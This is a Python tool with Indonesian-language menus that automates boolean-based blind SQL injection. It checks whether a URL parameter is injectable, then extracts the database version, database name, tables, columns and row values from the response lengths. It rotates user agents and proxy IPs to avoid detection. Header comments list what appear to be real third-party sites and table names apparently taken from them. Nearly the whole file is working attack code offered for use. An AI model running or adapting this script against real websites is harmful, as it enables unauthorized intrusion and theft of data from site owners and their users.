import requests, random
from itertools import cycle

#AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=4#
#and (select length(database()))=4#
#shihka
#wwwaring_db
#https://fitofarmaka.sijahe.com/page.php?id=1
#https://aringocomputer.com/product.php?id=3
#merek
#group_arang
#barang
#contact_t

def query(url_target, url_length):
    while True:
            quer = input('Query:')
            
            if (quer == 'q'):
                break
            else:
                url_query = url_target + quer    
                req_query = s.get(url_query)
                res_query = req_query.text
                res_total = sum(len(i) for i in res_query)     
                       
                if (res_total == url_length):                   
                      print('True')
                elif (res_total > url_length):
                      print('True')
                else:
                      print('False')

def get_columnval(url_target, url_length, tab_name, w, r, t):
       payload = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '@', '#', '$', '_', '&','-', '+', '(', ')', '/', '*']              
       colval = '' 
       se = 0
       
       for x in range(t+1):
        for j in range(len(payload)):
          ce = payload[se]
          if colval is None:
            url_gettable = url_target + " AND (SELECT "+str(r)+" FROM "+str(tab_name)+" LIMIT 1) LIKE '"+str(ce)+"%'#**"
            req_gettable = s.get(url_gettable)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_gettable)
                       
            if (res_total == url_length):   
                 colval += ce
                 se = 0
            else:
                 se += 1            
          else:
            url_gettable = url_target + " AND (SELECT "+str(r)+" FROM "+str(tab_name)+" LIMIT 1) LIKE '"+str(colval)+str(ce)+"%'#**"
            req_gettable = s.get(url_gettable)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_gettable)
                       
            if (res_total == url_length):   
                 colval += ce
                 se = 0
            else:
                 se += 1               

                 if j == len(payload) - 1:
                     se = 0
                 else:
                     pass          

       return colval                                  
                                                                           
def get_columnvallength(url_target, url_length, tab_name, w, r): 
       for m in range(1, 1000):
            url_get = url_target + " AND (SELECT LENGTH("+str(r)+") FROM "+str(tab_name)+" LIMIT 1)="+str(m)+"#**"
            req_gettable = s.get(url_get)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_get)
            
            if (res_total == url_length):       
                 print('[+]Total Length value column:',m)
                 return m
            else:
                 pass          
   
def get_namecolumn(url_target, url_length, tab_name, w, e, user_agent):
       payload = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '@', '#', '$', '_', '&','-', '+', '(', ')', '/', '*']              
       colname = '' 
       se = 0
              
       for x in range(e+1):
        for j in range(len(payload)):
          ce = payload[se]
          if colname is None:
            url_gettable = url_target + " AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+str(tab_name)+"' LIMIT "+str(w)+",1) LIKE '"+ce+"%'#**"        
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            req_gettable = s.get(url_gettable, headers=headers)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_gettable)
                       
            if (res_total == url_length):   
                 colname += ce
                 se = 0
            else:
                 se += 1
          else:                  
            url_gettable = url_target + " AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+str(tab_name)+"' LIMIT "+str(w)+",1) LIKE '"+ colname + ce +"%'#**"       
            h = random.choice(user_agent)
            headers = {'User-Agent': h}              
            req_gettable = s.get(url_gettable, headers=headers)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_gettable)
                       
            if (res_total == url_length):   
                 colname += ce                
                 se = 0     
            else:
                 se += 1
                 
                 if j == len(payload) - 1:
                     se = 0
                 else:
                     pass          

       return colname                 
       
def get_lengthcolname(url_target, url_length, tab_name, w, user_agent):    
       for m in range(1, 100):
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            url_get = url_target + " AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+str(tab_name)+"' LIMIT "+str(w)+",1)="+str(m)+"#**"
            req_gettable = s.get(url_get, headers=headers)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_get)
            
            if (res_total == url_length):       
                 print('[+]Total Length col name:',m)
                 return m
            else:
                 pass                         
                        
def gettotal_column(url_target, url_length, tab_name, user_agent):
       for w in range(1, 100):
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            url_get = url_target + " AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+str(tab_name)+"')="+str(w)+"#**"
            req_gettable = s.get(url_get, headers=headers)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_get)
            
            if (res_total == url_length):       
                 print('[+]Total Column:',w)
                 return w
            else:
                 pass                         

def get_tablebyinput(url_target, url_length, le, tab_name, user_agent):
    for r in range(le+1):
            url_gettable = url_target + " AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT "+str(r)+",1) LIKE '"+tab_name+"%'#**"
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            req_gettable = s.get(url_gettable, headers=headers)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_gettable)
                       
            if (res_total == url_length):   
                 print('[+]Table Name ',tab_name, ' Found')
                 return tab_name
            else:
                 pass
                 
def get_tablename(url_target, url_length, i, l, user_agent):
       payload = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '@', '#', '$', '_', '&','-', '+', '(', ')', '/', '*']       
       
       db = ''
       user_agent = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
       proxies = ['http://130.61.120.213:8888', 'http://167.102.133.107:80']
       pool = cycle(proxies)
       se = 0
 
       for x in range(l):
        for j in range(len(payload)):
          ce = payload[se]
          
          if db is None:
            url_gettable = url_target + " AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT "+str(i)+",1) LIKE '"+ce+"%'#**"
            proxy = next(pool)  
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            proxies = {"http": proxy}            
            req_gettable = s.get(url_gettable, headers=headers, proxies=proxies)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_gettable)
                       
            if (res_total == url_length):   
                 db += ce
                 se = 0
            else:
                 se += 1
          else:                  
            url_gettable = url_target + " AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT "+str(i)+",1) LIKE " + "'" + db + ce + "%" + "'" + "#**"                             
            proxy = next(pool)  
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            proxies = {"http": proxy}            
            req_gettable = s.get(url_gettable, proxies=proxies, headers=headers)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
            print(url_gettable)
                       
            if (res_total == url_length):   
                 db += ce                
                 se = 0     
            else:
                 se += 1
                 
                 if j == len(payload) - 1:
                     se = 0
                 else:
                     pass          

       return db          
                                                      
def length_tablename(url_target, url_length, le, i):
       user_agent = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
       proxies = ['http://130.61.120.213:8888', 'http://167.102.133.107:80']
       pool = cycle(proxies)
              
       for x in range(1, 100):
            url_gettable = url_target + " AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT "+str(i)+",1)="+str(x)+"#**"
            proxy = next(pool)  
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            proxies = {"http": proxy}                        
            req_gettable = s.get(url_gettable, headers=headers, proxies=proxies)
            res_reqgettable = req_gettable.text
            res_total = sum(len(i) for i in res_reqgettable)
                       
            if (res_total == url_length):   
                 return x            
            else:
                 pass        
                                                                                                                       
def get_totaltable(url_length, url_target):
      user_agent = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
      proxies = ['http://130.61.120.213:8888', 'http://167.102.133.107:80']
      pool = cycle(proxies)      
      
      for w in range(1, 100):
            url_totaltable = url_target + ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())='+str(w)+'#'
            proxy = next(pool)  
            h = random.choice(user_agent)
            headers = {'User-Agent': h}
            proxies = {"http": proxy}                   
            req_total = s.get(url_totaltable, headers=headers)
            res_total = req_total.text
            le_total = sum(len(i) for i in res_total)
            
            if (le_total == url_length):
                  return w
            elif (le_total > url_length):
                  return w
            else:
                 pass               

def get_versionsql2(url_length, url_target):
       payload = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&*()_{}:<>.,?'    
       qb = []

       for x in range(1, 2+1):
            for c in payload:
                  url_ver = url_target + ' AND (SELECT SUBSTRING(VERSION(),'+ str(x) + ',1))=' + str(c) + '#'
                  req_getver = s.get(url_ver)
                  res_getver = req_getver.text
                  text_getver = sum(len(i) for i in res_getver)           
                  print(url_ver)                       
                  
                  if (text_getver == url_length):
                       qb.append(c)
                       print(qb)
                  else:
                       pass     
                                                     
       return qb 

def get_versionsql(url_length, url_target, user_agent, proxies):
       payload = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', ',', '.', '@', '#', '$', '_', '&','-', '+', '(', ')', '/', '*']
       db = []
       a = 0
       z = 0
       
       user_agent = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"]
       proxies = ['http://130.61.120.213:8888', 'http://167.102.133.107:80']
       pool = cycle(proxies)
            
       for j in range(len(payload)):
                  ce = payload[a]
                  url_ver = url_target + ' AND (SELECT SUBSTRING(VERSION(),'+ str(z) + ',1))="' + ce + '"#'
                  proxy = next(pool)  
                  h = random.choice(user_agent)
                  headers = {'User-Agent': h}
                  proxies = {"http": proxy}
                  req_getver = s.get(url_ver, headers=headers)
                  res_getver = req_getver.text
                  text_getver = sum(len(i) for i in res_getver)           
                  print(url_ver)                       
                  
                  if (text_getver == url_length):
                       db.append(ce)
                       print(db)
                       a = 0
                  else:
                      url_ver = url_target + ' AND (SELECT SUBSTRING(VERSION(),'+ str(z) + ',1))=' + ce + '#'
                      req_getver = s.get(url_ver)
                      res_getver = req_getver.text
                      text_getver = sum(len(i) for i in res_getver)           
                      print(url_ver)                                        
                      if (text_getver == url_length):
                         db.append(ce)
                         print(db)
                         a = 0
                      else:
                         a += 1              
                         
                         if j == len(payload) - 1:
                            a = 0
                         else:
                             pass                                                                                
       return db
                                   
def exploit(i, url_length, url_target):
   payload = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&*()_+{}:<>?'

   for xploit in payload:
      url_getdb = url_target + ' and (select substring(database(),'+str(i)+',1))="'+xploit+'"-- -'    
      req_getdb = s.get(url_getdb)
      res_getdb = req_getdb.text
      text_getdb = sum(len(i) for i in res_getdb)
    
      if (text_getdb == url_length):
        return xploit
      else:
        pass

def xploit2(i, url_length, url_target):
    payload = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&*()_+{}:<>?'
       
    for xploit in payload:
      to_hex = bytes(xploit, 'utf-8').hex()
      url_getdb = url_target + ' and (select substring(database(),'+str(i)+',1))=0x'+to_hex+'-- -'
      req_getdb = s.get(url_getdb)
      res_getdb = req_getdb.text
      text_getdb = sum(len(i) for i in res_getdb) 
      print(url_getdb) 
      
      if (text_getdb == url_length):
        print(to_hex)
        return xploit
      else:
        pass                
                        
def get_length_db(url_length, url_target):
   print('[+]Menggunakan Hexadecimal')
   for x in range(1, 50):
      url_getlength = url_target + ' and (select length(database()))=' +str(x)+ '#'
      req_length = s.get(url_getlength)
      res_length = req_length.text
      text_getlength = sum(len(i) for i in res_length)
   
      if (text_getlength == url_length):
          return x
          break
      else:
          pass
         
def get_dbname(get_length, url_length, url_target):
   name_db = []
   le = get_length_db(url_length, url_target)
  
   for i in range(1, le+1):
     get_name = exploit(i, url_length, url_target)
     
     if get_name is None:
         exp = xploit2(i, url_length, url_target)
         name_db.append(exp)
     else:         
         name_db.append(get_name)

   return name_db

def check_isvuln(get_url):
   url1 = get_url + ' and 1 = 0 -- -'
   req1 = s.get(url1)
   res_url1 = req1.text
   url_length1 = sum(len(i) for i in res_url1)
   
   for q in range(1, 50):
      url2 = get_url + ' and 1 = ' +str(q)+ ' -- -'
      req2 = s.get(url2)
      res_url2 = req2.text
      url_length2 = sum(len(i) for i in res_url2)

      if (url_length2 == url_length1):
         pass
         print('nv')
      else:
         print('[+]URL Vuln')
         return url2

user_agent = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1", "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"]

proxies = ['http://130.61.120.213:8888', 'http://167.102.133.107:80']

s = requests.Session()
url_target = input('Masukan URL Target (ex:https://target.com/product.php?id=3):')
print('[+]Mengecek URL apakah vuln')
get_url = check_isvuln(url_target)
print('[+]Mengeksekusi perintah')

req = s.get(get_url)
print('[+]Request session berjalan')
print('[+]Request Text')
res_url = req.text

url_length = sum(len(i) for i in res_url)
print('[+]Berhasil')

while True:
       print("\n")
       print('1. Lihat versi database')
       print('2. Lihat nama database')
       print('3. Lihat tabel database')
       print('4. Input query')
       sel = input('>')                         
       
       if sel == '1':
            q = get_versionsql(url_length, url_target, user_agent, proxies)
            
            if q is None:            
               s = get_versionsql2(url_length, url_target)

               for a in s:
                   print(a, end="")                              
            else:
               for w in q:
                   print(w, end="")
       elif sel == '2':
            print('[+]Sedang mengecek panjang nama. Please Wait...') 
            get_length = get_length_db(url_length, url_target)
            print('[+]Sedang mengecek nama')    
            get_l = get_dbname(get_length, url_length, url_target) 
            print('[+]Sedang mengecek nama')    
            print('[+]Database ditemukan. nama database:')
            
            for t in get_l:
                 print(t, end="")
       elif sel == '3':   
           dat = []  
           print('[+]Mencari jumlah tabel')  
           le = get_totaltable(url_length, url_target)
           print('[+]Total Tabel:' ,le)  
           print('1. Cari tabel langsung(ex:user')
           print('2. Lihat semua tabel')
           r = input('>')
           
           if r == '1':
               tab_name = input('Nama tabel:')
               k = get_tablebyinput(url_target, url_length, le, tab_name, user_agent)
               h = input('Lihat isi tabel(y/t):')
               
               if h == 'y':
                   q = gettotal_column(url_target, url_length, tab_name, user_agent)
                   namecol = []
                   col = []
                   
                   for w in range(q):
                      e = get_lengthcolname(url_target, url_length, tab_name, w, user_agent)
                      r = get_namecolumn(url_target, url_length, tab_name, w, e, user_agent)
                      namecol.append(r)
                      print(namecol)
                      t = get_columnvallength(url_target, url_length, tab_name, w, r)
                      y = get_columnval(url_target, url_length, tab_name, w, r, t)
                      col.append(y)
                      print(col)
                      
                   print(namecol)        
                   print(col)              
               elif h == 't':
                   pass
           elif r == '2':   
            print("[+]Nama Tabel:")
           
            for i in range(0, le):
              l =  length_tablename(url_target, url_length, le, i)
              dat.append(get_tablename(url_target, url_length, i, l, user_agent))      
              print(dat)           
                       
            for w in dat:                            
                  print('[+]',w, end="")           
                  print("\n")         
                  
            q = input('Ingin lihat isi tabel(y/t):')
           
            if q == 'y':
               w = input('Pilih Nama tabel:')
               
               if w == 'y':
                   pass
               elif w == 't':
                   pass
            elif q == 't':
               pass                                    
       elif sel == '4':
             query(url_target, url_length)                                                                            